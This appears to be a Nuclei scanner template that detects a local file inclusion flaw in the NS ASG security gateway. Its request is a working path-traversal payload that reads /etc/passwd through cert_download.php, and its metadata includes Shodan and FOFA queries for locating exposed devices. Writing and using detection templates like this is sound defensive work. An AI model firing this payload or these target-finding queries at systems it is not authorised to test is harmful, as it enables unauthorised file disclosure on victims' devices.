http:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: body
    type: word
    words:
    - $certfile
    - application/pdf
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd'
  - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php'
  stop-at-first-match: true
id: nsasg-arbitrary-file-read
info:
  author: pikpikcu,ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: NS ASG is vulnerable to local file inclusion.
  metadata:
    fofa-query: "app=\"\u7F51\u5EB7\u79D1\u6280-NS-ASG\u5B89\u5168\u7F51\u5173\""
    max-request: 2
    shodan-query: "http.title:\u201CNS-ASG\u201D"
  name: NS ASG - Local File Inclusion
  reference:
  - https://zhuanlan.zhihu.com/p/368054963
  - "http://wiki.xypbk.com/Web\u5B89\u5168/\u7F51\u5EB7%20NS-ASG\u5B89\u5168\u7F51\
    \u5173/\u7F51\u5EB7%20NS-ASG\u5B89\u5168\u7F51\u5173%20\u4EFB\u610F\u6587\u4EF6\
    \u8BFB\u53D6\u6F0F\u6D1E.md"
  severity: high
  tags: nsasg,lfi
